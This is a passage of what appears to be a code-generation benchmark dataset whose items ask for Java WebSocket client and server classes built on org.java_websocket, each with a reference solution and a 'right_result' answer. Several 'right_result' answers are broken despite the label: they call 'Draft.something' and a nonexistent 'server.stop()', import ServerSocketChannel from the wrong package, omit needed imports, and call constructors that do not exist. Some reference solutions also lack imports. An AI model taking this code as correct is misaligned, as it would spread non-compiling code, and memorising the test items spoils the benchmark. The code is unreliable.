    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.ByteBuffer;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class TestWebSocket extends WebSocketClient {\n\n    public TestWebSocket(int port) throws URISyntaxException {\n        super(new URI(\"ws://localhost:\" + port));\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onMessage(ByteBuffer message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.nio.ByteBuffer;\n\npublic class TestWebSocket extends WebSocketClient {\n    public TestWebSocket(int port) throws URISyntaxException {\n        super(new URI(\"ws://localhost:\" + port));\n        this.connect();\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received text message: \" + message);\n    }\n\n    @Override\n    public void onMessage(ByteBuffer message) {\n        System.out.println(\"Received binary message\");\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed with code \" + code + \", reason: \" + reason + \", remote: \" + remote);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}"
  },
  {
    "Task_id": 466,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a WebSocket connection, handle connection events, and manage message exchange with a WebSocket server.\n\nClass Description: The MyWebSocketClient class extends WebSocketClient to create a WebSocket client that connects to a specified URI. It overrides key WebSocket event-handling methods to manage connection lifecycle events and message processing. The class uses a CountDownLatch to synchronize thread operations during connection closure.\n\nAttributes:\n- onCloseLatch: CountDownLatch - A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes, specifically used to signal when the WebSocket connection is closed.\n\nMethods:\n- MyWebSocketClient(URI uri, CountDownLatch latch) -> None - Constructor that initializes the WebSocket client with the server URI and a CountDownLatch for connection closure synchronization.\n- onOpen(ServerHandshake handshakedata) -> None - Callback method invoked when a WebSocket connection is successfully established.\n- onMessage(String message) -> None - Callback method invoked when a message is received from the WebSocket server.\n- onClose(int code, String reason, boolean remote) -> None - Callback method invoked when the WebSocket connection is closed, triggers the CountDownLatch.\n- onError(Exception ex) -> None - Callback method invoked when an error occurs on the WebSocket connection.",
    "Canonical_solution": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketClient extends WebSocketClient {\n    private final CountDownLatch onCloseLatch;\n\n    public MyWebSocketClient(URI uri, CountDownLatch latch) {\n        super(uri);\n        onCloseLatch = latch;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Connection opened callback\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Message received callback\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        onCloseLatch.countDown();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Error handling callback\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketClient extends WebSocketClient {\n    private final CountDownLatch onCloseLatch;\n\n    public MyWebSocketClient(URI uri, CountDownLatch latch) {\n        super(uri);\n        this.onCloseLatch = latch;\n        super.connect();\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        onCloseLatch.countDown();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n    }\n}"
  },
  {
    "Task_id": 468,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from org.java_websocket. It provides lifecycle methods for managing WebSocket connections and includes a CountDownLatch for server startup synchronization.\n\nAttributes:\n- serverLatch: CountDownLatch - Used to signal when the server has started (nullable)\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress address, int decodercount, List<Draft> drafts, Collection<WebSocket> connectionscontainer) -> void - Creates a server instance with specified address, decoder count, protocol drafts, and connection container\n- Constructor: MyWebSocketServer(int port, CountDownLatch serverLatch) -> void - Creates a server instance with specified port and startup latch\n- Constructor: MyWebSocketServer(int port) -> void - Creates a server instance with specified port (no latch)\n- onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects\n- onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n- onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n- onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.util.Collection;\nimport java.util.List;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private CountDownLatch serverLatch = null;\n\n    public MyWebSocketServer(InetSocketAddress address, int decodercount, List<Draft> drafts,\n        Collection<WebSocket> connectionscontainer) {\n      super(address, decodercount, drafts, connectionscontainer);\n    }\n\n    public MyWebSocketServer(int port, CountDownLatch serverLatch) {\n      super(new InetSocketAddress(port));\n      this.serverLatch = serverLatch;\n    }\n\n    public MyWebSocketServer(int port) {\n      this(port, null);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n      ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n      if (serverLatch != null) {\n        serverLatch.countDown();\n      }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Collection;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n    private CountDownLatch serverLatch;\n\n    public MyWebSocketServer(InetSocketAddress address, int decodercount, List<Draft> drafts, Collection<WebSocket> connectionscontainer) {\n        super(address, decodercount, drafts, connectionscontainer);\n        this.serverLatch = null;\n    }\n\n    public MyWebSocketServer(int port, CountDownLatch serverLatch) {\n        super(new InetSocketAddress(port), 1, Collections.singletonList(Draft.something), new ArrayList<WebSocket>());\n        this.serverLatch = serverLatch;\n    }\n\n    public MyWebSocketServer(int port) {\n        super(new InetSocketAddress(port), 1, Collections.singletonList(Draft.something), new ArrayList<WebSocket>());\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Handle incoming message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle error\n    }\n\n    @Override\n    public void onStart() {\n        if (serverLatch != null) {\n            serverLatch.countDown();\n        }\n    }\n}"
  },
  {
    "Task_id": 469,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors, with synchronization support using CountDownLatch.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends WebSocketServer from org.java_websocket. It manages client connections and messages while providing synchronization points for server startup and message reception using CountDownLatch.\n\nAttributes:\ncountServerLatch: [CountDownLatch] - Synchronization aid to signal when the server has started  \ncountClientMessageLatch: [CountDownLatch] - Synchronization aid to signal when a client message is received  \n\nMethods:\nConstructor: [MyWebSocketServer](int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) -> [void] - Initializes the WebSocket server with specified port and synchronization latches  \nonOpen: [onOpen](WebSocket conn, ClientHandshake handshake) -> [void] - Callback for new client connections  \nonClose: [onClose](WebSocket conn, int code, String reason, boolean remote) -> [void] - Callback for client disconnections  \nonMessage: [onMessage](WebSocket conn, String message) -> [void] - Callback for processing received messages (decrements message latch)  \nonError: [onError](WebSocket conn, Exception ex) -> [void] - Callback for error handling (prints stack trace)  \nonStart: [onStart]() -> [void] - Callback when server starts (decrements server latch)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch,\n        CountDownLatch countClientMessageLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        countClientMessageLatch.countDown();\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) {\n        super(port);\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        countClientMessageLatch.countDown();\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        super.onStart();\n        countServerLatch.countDown();\n    }\n}"
  },
  {
    "Task_id": 470,
    "Instruction": "Task Description: Implement a WebSocket server class for handling real-time communication between clients, including connection management, message broadcasting, and error handling.\n\nClass Description: ChatServer is a WebSocket server implementation that extends WebSocketServer from org.java_websocket library. It manages client connections, processes incoming messages (both text and binary), broadcasts messages to all connected clients, and handles connection events and errors.\n\nAttributes:\n- (Inherited from WebSocketServer) port: int - The port number on which the server listens\n- (Inherited from WebSocketServer) address: InetSocketAddress - The network address of the server\n- (Inherited from WebSocketServer) draft: Draft_6455 - The WebSocket protocol draft being used\n\nMethods:\n- ChatServer(int port) -> None - Constructor that initializes the server with specified port\n- ChatServer(InetSocketAddress address) -> None - Constructor that initializes the server with specified socket address\n- ChatServer(int port, Draft_6455 draft) -> None - Constructor that initializes the server with specified port and protocol draft\n- onOpen(WebSocket conn, ClientHandshake handshake) -> void - Handles new client connections, sends welcome message, and notifies other clients\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Handles client disconnections and notifies other clients\n- onMessage(WebSocket conn, String message) -> void - Processes incoming text messages and broadcasts to all clients\n- onMessage(WebSocket conn, ByteBuffer message) -> void - Processes incoming binary messages and broadcasts to all clients\n- onError(WebSocket conn, Exception ex) -> void - Handles errors that occur during WebSocket operations\n- onStart() -> void - Initializes server settings when the server starts",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class ChatServer extends WebSocketServer {\n\n    public ChatServer(int port) {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    public ChatServer(int port, Draft_6455 draft) {\n        super(new InetSocketAddress(port), Collections.<Draft>singletonList(draft));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.send(\"Welcome to the server!\");\n        broadcast(\"new connection: \" + handshake.getResourceDescriptor());\n        System.out.println(conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room!\");\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        broadcast(conn + \" has left the room!\");\n        System.out.println(conn + \" has left the room!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(message.array());\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n        setConnectionLostTimeout(100);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.server.WebSocketServer;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft_6455;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class ChatServer extends WebSocketServer {\n    private List<WebSocket> clients;\n\n    public ChatServer(int port) {\n        super(port);\n        this.clients = new ArrayList<>();\n    }\n\n    public ChatServer(InetSocketAddress address) {\n        super(address);\n        this.clients = new ArrayList<>();\n    }\n\n    public ChatServer(int port, Draft_6455 draft) {\n        super(port, draft);\n        this.clients = new ArrayList<>();\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        clients.add(conn);\n        broadcast(\"User joined: \" + conn.getRemoteSocketAddress());\n        conn.send(\"Welcome to the chat!\");\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        clients.remove(conn);\n        broadcast(\"User left: \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        super.onStart();\n        System.out.println(\"Chat server started on port \" + getPort());\n    }\n\n    private void broadcast(Object message) {\n        for (WebSocket client : clients) {\n            if (message instanceof String) {\n                client.send((String) message);\n            } else if (message instanceof ByteBuffer) {\n                client.send((ByteBuffer) message);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 471,
    "Instruction": "Task Description: Create a WebSocket server implementation using org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from org.java_websocket. It provides lifecycle methods for managing client connections and communication.\n\nAttributes:\n- inherited from WebSocketServer: Various internal attributes for managing server state and connections\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress inetSocketAddress) -> void - Initializes the server with specified socket address\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects\n- onMessage: onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n- onError: onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n- onStart: onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress inetSocketAddress) {\n        super(inetSocketAddress);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message from client\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup logic\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n    public MyWebSocketServer(InetSocketAddress inetSocketAddress) {\n        super(inetSocketAddress);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection: \" + conn);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed: \" + code + \" \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message: \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started\");\n    }\n}"
  },
  {
    "Task_id": 473,
    "Instruction": "Task Description: Implement a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library.\n\nClass Description: The SocketActivation class extends WebSocketServer to create a custom WebSocket server. It manages client connections, broadcasts messages to all connected clients, and handles server lifecycle events. The server tracks the number of connected clients and shuts down when no clients remain.\n\nAttributes:\n- clients: AtomicInteger - Tracks the number of currently connected clients\n\nMethods:\n- SocketActivation(ServerSocketChannel chan) -> None - Constructor that initializes the WebSocket server with the given ServerSocketChannel\n- onOpen(WebSocket conn, ClientHandshake handshake) -> None - Handles new client connections, sends welcome message, and broadcasts connection event\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> None - Handles client disconnections, broadcasts departure event, and shuts down server if no clients remain\n- onMessage(WebSocket conn, String message) -> None - Broadcasts received text messages to all clients and logs the message\n- onMessage(WebSocket conn, ByteBuffer message) -> None - Broadcasts received binary messages to all clients and logs the message\n- onError(WebSocket conn, Exception ex) -> None - Handles and logs any errors that occur during WebSocket operations\n- onStart() -> None - Called when the server starts successfully, logs server startup",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ServerSocketChannel;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class SocketActivation extends WebSocketServer {\n\n    private AtomicInteger clients = new AtomicInteger(0);\n\n    public SocketActivation(ServerSocketChannel chan) {\n        super(chan);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.send(\"Welcome to the server!\");\n        broadcast(\"new connection: \" + handshake.getResourceDescriptor());\n        if(clients.get() == 0) {\n            broadcast(\"You are the first client to join\");\n        }\n        System.out.println(conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room!\");\n        clients.incrementAndGet();\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        broadcast(conn + \" has left the room!\");\n        System.out.println(conn + \" has left the room!\");\n        if(clients.decrementAndGet() <= 0) {\n            System.out.println(\"No more clients left, exiting\");\n            System.exit(0);\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(message.array());\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.ServerSocketChannel;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class SocketActivation extends WebSocketServer {\n    private final AtomicInteger clients = new AtomicInteger(0);\n\n    public SocketActivation(ServerSocketChannel chan) {\n        super(chan);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.send(\"Welcome to the WebSocket server!\");\n        broadcastMessage(\"Client connected: \" + conn.getRemoteAddress());\n        clients.incrementAndGet();\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        clients.decrementAndGet();\n        broadcastMessage(\"Client disconnected: \" + conn.getRemoteAddress());\n        if (clients.get() == 0) {\n            server.stop();\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcastMessage(message);\n        logMessage(\"Received text message: \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        String msg = new String(message.array());\n        broadcastMessage(msg);\n        logMessage(\"Received binary message: \" + msg);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        log(\"Server started\");\n    }\n\n    private void broadcastMessage(String message) {\n        for (WebSocket client : getConnectedClients()) {\n            client.send(message);\n        }\n    }\n\n    private void logMessage(String message) {\n        System.out.println(message);\n    }\n\n    private void log(String message) {\n        System.out.println(message);\n    }\n}"
  },
  {
    "Task_id": 474,
    "Instruction": "Task Description: Implement a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should assign unique IDs to clients and log connection events.\n\nClass Description: ChatServerAttachmentExample is a WebSocket server implementation that manages client connections, tracks clients with unique IDs, and handles text/binary messages. It extends WebSocketServer from the org.java_websocket library.\n\nAttributes:\n- index: Integer - Tracks the next available client ID to be assigned\n\nMethods:\n- Constructor(port: int) -> None - Creates server instance bound to specified port\n- Constructor(address: InetSocketAddress) -> None - Creates server instance bound to specified address\n- onOpen(conn: WebSocket, handshake: ClientHandshake) -> void - Handles new client connections, assigns ID\n- onClose(conn: WebSocket, code: int, reason: String, remote: boolean) -> void - Handles client disconnections\n- onMessage(conn: WebSocket, message: String) -> void - Processes text messages from clients\n- onMessage(conn: WebSocket, message: ByteBuffer) -> void - Processes binary messages from clients\n- onError(conn: WebSocket, ex: Exception) -> void - Handles connection errors\n- onStart() -> void - Called when server starts successfully",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class ChatServerAttachmentExample extends WebSocketServer {\n\n    Integer index = 0;\n\n    public ChatServerAttachmentExample(int port) throws UnknownHostException {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServerAttachmentExample(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.setAttachment(index);\n        index++;\n        System.out.println(\n            conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room! ID: \"\n                + conn.<Integer>getAttachment());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(conn + \" has left the room! ID: \" + conn.<Integer>getAttachment());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket; import org.java_websocket.handshake.ClientHandshake; import org.java_websocket.server.WebSocketServer; import java.net.InetSocketAddress; import java.util.HashMap; import java.util.Map; public class ChatServerAttachmentExample extends WebSocketServer { private int index = 0; private final Map<Integer, WebSocket> clients = new HashMap<>(); public ChatServerAttachmentExample(int port) { super(port); } public ChatServerAttachmentExample(InetSocketAddress address) { super(address); } @Override public void onOpen(WebSocket conn, ClientHandshake handshake) { int clientId = index++; clients.put(clientId, conn); System.out.println(\"Client connected with ID: \" + clientId); } @Override public void onClose(WebSocket conn, int code, String reason, boolean remote) { for (Map.Entry<Integer, WebSocket> entry : clients.entrySet()) { if (entry.getValue() == conn) { clients.remove(entry.getKey()); break; } } System.out.println(\"Client disconnected. Reason: \" + reason); } @Override public void onMessage(WebSocket conn, String message) { System.out.println(\"Received text message: \" + message); conn.send(\"Echo: \" + message); } @Override public void onMessage(WebSocket conn, ByteBuffer message) { System.out.println(\"Received binary message\"); } @Override public void onError(WebSocket conn, Exception ex) { ex.printStackTrace(); System.out.println(\"Error occurred: \" + ex.getMessage()); } @Override public void onStart() { System.out.println(\"Server started successfully.\"); } }"
  },
  {
    "Task_id": 475,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: The WSocketServer class extends WebSocketServer to create a custom WebSocket server that manages client connections and communication. It handles lifecycle events including connection opening, message reception, connection closing, and errors. The server can broadcast messages to all connected clients.\n\nAttributes:\n- Inherited attributes from WebSocketServer (base class handles socket connections and client management)\n\nMethods:\n- Constructor: WSocketServer(int port) throws UnknownHostException - Creates a server instance bound to the specified port.\n- Constructor: WSocketServer(InetSocketAddress address) - Creates a server instance bound to the specified socket address.\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Handles new client connections and sends a handshake confirmation.\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Handles client disconnections and notifies other clients.\n- onMessage: onMessage(WebSocket conn, String message) -> void - Processes incoming messages from clients and echoes them back.\n- onError: onError(WebSocket conn, Exception ex) -> void - Handles errors occurring during WebSocket operations.\n- sendToClient: sendToClient(String text) -> void - Broadcasts a message to all connected clients (thread-safe operation).",
    "Canonical_solution": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.util.Collection;\n\npublic class WSocketServer extends WebSocketServer {\n\n    public WSocketServer(int port) throws UnknownHostException {\n        super(new InetSocketAddress(port));\n    }\n\n    public WSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket webSocket, ClientHandshake clientHandshake) {\n        this.sendToClient(\"[Handshake Ok]\");\n    }\n\n    @Override\n    public void onClose(WebSocket webSocket, int i, String s, boolean b) {\n        this.sendToClient(webSocket + \" close\");\n    }\n\n    @Override\n    public void onMessage(WebSocket webSocket, String message) {\n        this.sendToClient(message);\n    }\n\n    @Override\n    public void onError(WebSocket webSocket, Exception e) {\n        e.printStackTrace();\n        if (webSocket != null) {\n            // Error handling for specific WebSocket\n        }\n    }\n\n    public void sendToClient(String text) {\n        Collection<WebSocket> con = connections();\n        synchronized (con) {\n            for (WebSocket c : con) {\n                c.send(text);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.server.WebSocketServer;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.WebSocket;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class WSocketServer extends WebSocketServer {\n    private final List<WebSocket> clients = new ArrayList<>();\n\n    public WSocketServer(int port) throws UnknownHostException {\n        super(port);\n    }\n\n    public WSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        clients.add(conn);\n        conn.send(\"Connected!\");\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        clients.remove(conn);\n        sendToClient(\"Client disconnected: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        sendToClient(message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    public void sendToClient(String text) {\n        synchronized (clients) {\n            for (WebSocket client : clients) {\n                client.send(text);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 476,
